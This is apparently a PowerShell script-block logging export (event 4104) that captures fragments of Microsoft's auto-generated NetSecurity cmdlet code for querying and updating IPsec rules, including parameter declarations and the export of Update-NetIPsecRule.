            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EndpointType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EndpointType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EndpointType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EndpointType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('PassThru')) {
            [object]$__cmdletization_value = ${PassThru}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PassThru'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PassThru'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Output'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetPolicyDelta', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $false
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Update-NetIPsecRule' -Alias '*'
        


ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (22 of 23):
lues = @(${KeyModule})
        $__cmdletization_queryBuilder.FilterByProperty('KeyModule', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowWatchKey') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowWatchKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowWatchKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowSetKey') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowSetKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowSetKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RemoteTunnelHostname') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RemoteTunnelHostname})
        $__cmdletization_queryBuilder.FilterByProperty('RemoteTunnelEndpointDNSName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('ForwardPathLifetime') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ForwardPathLifetime})
        $__cmdletization_queryBuilder.FilterByProperty('MaxReturnPathLifetimeSeconds', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EncryptedTunnelBypass') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EncryptedTunnelBypass})
        $__cmdletization_queryBuilder.FilterByProperty('BypassTunnelIfEncrypted', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RequireAuthorization') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RequireAuthorization})
        $__cmdletization_queryBuilder.FilterByProperty('RequireAuthorization', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('User') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${User})
        $__cmdletization_queryBuilder.FilterByProperty('Users', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Machine') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Machine})
        $__cmdletization_queryBuilder.FilterByProperty('Machines', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetConSecRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceFilter') -and (@('ByAssociatedNetFirewallInterfaceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceFilter}, 'MSFT_NetConSecRuleFilterByInterface', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceTypeFilter') -and (@('ByAssociatedNetFirewallInterfaceTypeFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceTypeFilter}, 'MSFT_NetConSecRuleFilterByInterfaceType', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallPortFilter') -and (@('ByAssociatedNetFirewallPortFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallPortFilter}, 'MSFT_NetConSecRuleFilterByProtocolPort', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetConSecRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase2AuthSet') -and (@('ByAssociatedNetIPsecPhase2AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase2AuthSet}, 'MSFT_NetConSecRuleEMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase1AuthSet') -and (@('ByAssociatedNetIPsecPhase1AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase1AuthSet}, 'MSFT_NetConSecRuleMMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecQuickModeCryptoSet') -and (@('ByAssociatedNetIPsecQuickModeCryptoSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecQuickModeCryptoSet}, 'MSFT_NetConSecRuleQMCryptoSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Servers')) {
            [object]$__cmdletization_value = ${Servers}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Servers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Servers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Domains')) {
            [object]$__cmdletization_value = ${Domains}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Domains'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Domains'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('EndpointType')) {
            [object]$__cmdletization_value = ${EndpointType}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EndpointType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EndpointType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EndpointType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EndpointType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('AddressType')) {
            [object]$__cmdletization_value = ${AddressType}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AddressType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.AddressVersion'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AddressType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.AddressVersion'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Output'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('DnsServers')) {
            [object]$__cmdletization_value = ${DnsServers}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsServers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (21 of 23):
tFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${Servers},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${Domains},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EndpointType]
    ${EndpointType},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.AddressVersion]
    ${AddressType},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${DnsServers},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('IPsecRuleName') -and (@('ByIPsecRuleName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${IPsecRuleName})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Mode') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Mode})
        $__cmdletization_queryBuilder.FilterByProperty('Mode', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('InboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${InboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('InboundSecurity', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('OutboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${OutboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('OutboundSecurity', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('QuickModeCryptoSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${QuickModeCryptoSet})
        $__cmdletization_queryBuilder.FilterByProperty('QuickModeCryptoSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase1AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
